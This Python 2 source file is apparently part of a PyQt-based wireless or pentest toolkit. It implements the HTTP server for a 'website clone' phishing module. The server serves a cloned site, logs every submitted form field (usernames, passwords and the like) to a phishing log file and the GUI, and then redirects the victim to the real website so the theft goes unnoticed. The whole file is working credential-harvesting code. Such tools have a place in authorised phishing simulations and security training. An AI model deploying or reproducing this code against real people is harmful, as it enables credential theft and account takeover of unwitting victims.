from PyQt4.QtCore import QThread,pyqtSignal
from Core.Utils import setup_logger
import BeautifulSoup
import SimpleHTTPServer
import BaseHTTPServer
import SocketServer
import threading
import urllib2
import logging
import cgi


class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Original_website,redirect_Path = None,None
    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
            'CONTENT_TYPE':self.headers['Content-Type'],
            }
        )
        if not form.list: return
        redirect = True
        for item in form.list:
            if item.name and item.value:
                self.log_message('',item.name+' : '+item.value)
        if redirect:
            self.redirect(self.redirect_Original_website)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

class ServerThreadHTTP(QThread):
    requestHTTP = pyqtSignal(object)
    def __init__(self,Address,PORT,redirect=None,directory=None):
        self.Address,self.PORT = Address,PORT
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory
        self.httpd = BaseHTTPServer.HTTPServer((self.Address, self.PORT), self.Handler)
        QThread.__init__(self)

    def run(self):
        print "Serving at: http://%(interface)s:%(port)s\n" % dict(interface=self.Address, port=self.PORT)
        self.Handler.log_message = self.Method_GET_LOG
        setup_logger('phishing', './Logs/Phishing/Webclone.log')
        self.log_phishing = logging.getLogger('phishing')
        self.httpd.serve_forever()

    def Method_GET_LOG(self,format, *args):
        self.log_phishing.info(list(args)[0])
        self.requestHTTP.emit(list(args)[0])

    def stop(self):
        self.httpd.shutdown()
        self.httpd.socket.close()